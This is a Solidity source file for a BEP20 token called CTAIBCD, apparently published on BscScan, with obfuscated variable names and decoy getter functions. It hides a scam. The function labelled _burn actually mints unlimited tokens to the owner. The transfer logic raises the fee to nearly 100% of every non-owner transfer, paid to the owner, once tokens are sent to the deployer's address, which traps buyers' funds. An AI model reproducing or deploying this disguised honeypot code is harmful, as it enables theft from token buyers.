/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.7;
contract CTAIBCD {
uint256 public constant DXPXYY = 99999;
address private  EDGTDP = address(0);
uint256 private  FTAIKZ = 10000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  XRJYFV = 1000000000000000000000;
address private  YPSVFJ = address(0);
address private  QBMEEK = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  LQGLDQ = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  FSUZIV = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  DUYMFB = 1000000000000000;
address private  KLQSYU = address(0);
string public  symbol = "CTAIBCD";
string public  name = "CTAIBCD";
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  YULELV = 100000000;
address public owner;
uint256 private  NMBEHO = 1000000000000000000;
uint256 private  DOIQGS = 10000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tKFSLCW 0");
require(spender != address(0), "fKFSLCW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getDUYMFB() private returns (uint256) {
return DUYMFB;
}

function _getYULELV() private returns (uint256) {
return YULELV;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

function _getEDGTDP() private returns (address) {
return EDGTDP;
}

function _getXRJYFV() private returns (uint256) {
return XRJYFV;
}

function _getQBMEEK() private returns (address) {
return QBMEEK;
}

function _getLQGLDQ() private returns (uint256) {
return LQGLDQ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getDOIQGS() private returns (uint256) {
return DOIQGS;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () public {
KLQSYU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getYPSVFJ() private returns (address) {
return YPSVFJ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "KFSLCW");
require(to != address(0), "KFSLCW");
require(amount <= balanceOf[from], "KFSLCW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DXPXYY/NMBEHO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==KLQSYU){
NMBEHO = DXPXYY+2;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}